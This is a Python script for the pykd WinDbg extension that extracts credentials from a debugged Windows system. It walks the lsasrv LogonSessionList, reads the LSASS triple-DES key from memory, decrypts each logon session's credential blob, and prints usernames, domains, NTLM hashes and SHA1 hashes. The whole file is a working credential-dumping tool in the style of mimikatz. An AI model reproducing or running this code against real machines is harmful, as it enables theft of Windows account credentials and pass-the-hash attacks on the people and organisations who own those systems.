import pykd
from pykd import *
import sys
import time
from pyDes import *
from binascii import unhexlify,hexlify
from hexdump import hexdump

# .load pykd

nt = None
EPROCESS = None

def setupGlobalObject():
    global nt, EPROCESS, ETHREAD
    try:
        nt = module("nt")
        EPROCESS = nt.type("_EPROCESS")
    except DbgException:
        dprintln("check symbol paths")

def error_log():
    print("\n(!) User Data structure ERROR - try reloading the target debugee OS")
    sys.exit()


def main():
    #retrieve usename and logondomain
    users_blob = (pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")).split('\n\n')
    #print(users_blob)
    #print(len(users_blob))
    # honestly, this part is useless, for first time checking only lol
    try:
        userdomain = []

        userdata_length = len(users_blob)-2
        for i in range(0, userdata_length, 1):
            user_data = (users_blob[i]).split('\n') # use this index to access multiple users
            username = user_data[0].split('  ')[1]
            logondomain = user_data[1].split('  ')[1]
            #print([user_data, username, logondomain])
            userdomain.append([username, logondomain])
        #print(userdomain)
    except IndexError:
        error_log()
    
    for j in range(0, len(userdomain)):
        print(userdomain[j])

    # retrieve crypto blob from each user
    crypto_blob = (pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B8\" poi(lsasrv!LogonSessionList)"))
    #print(crypto_blob)
    crypto_blob = crypto_blob.split('\n\n')
    #print(crypto_blob)
    #print(len(crypto_blob))

    # find 3DES key
    tripdes_key_blob = pykd.dbgCommand("db (poi(poi(lsasrv!h3DesKey)+0x10)+0x38)+4 L18")
    # print tripdes_key_blob
    tripdes_key =  tripdes_key_blob.split('  ')[1::2][:2]
    tripdes_key =  unhexlify("".join(tripdes_key).replace(" ", "").replace("-",""))
    print("\n(*) 3des key")
    print(hexlify(tripdes_key))

    for i in range(0, len(crypto_blob)-1):
        # saves the user's blob
        user_crypto  = ''.join(crypto_blob[i].split('  ')[1::2])

        # dump encrypted bytes
        user_crypto_neato = user_crypto.split('  ')[1::2]
        crypto = ''.join(user_crypto_neato)
        #print("(*) dump encrypted bytes")
        #print(crypto)
        try:
            user_crypto =  unhexlify(user_crypto.replace(" ", "").replace("-",""))
        except binascii.Error:
            error_log()
        #print("\n(*) user's crypto")
        #print(hexlify(user_crypto))

        # decrypting the blob - the iv can be anything sinc CBC is not using it
        k = triple_des(tripdes_key, CBC,bytes.fromhex('deadbeefdeadbeef'))
        a = k.decrypt(user_crypto)
        a = str(hexlify(a))
        ntlm,sha1 = a[150:182], a[214:254]
        print("\n(*)LOGONDOMAIN : " + userdomain[i][0])
        print("(*)USERNAME : " + userdomain[i][1])
        print("(*)NTLM : " + ntlm)
        print("(*)SHA1 : " + sha1)


if __name__ == "__main__":
    main()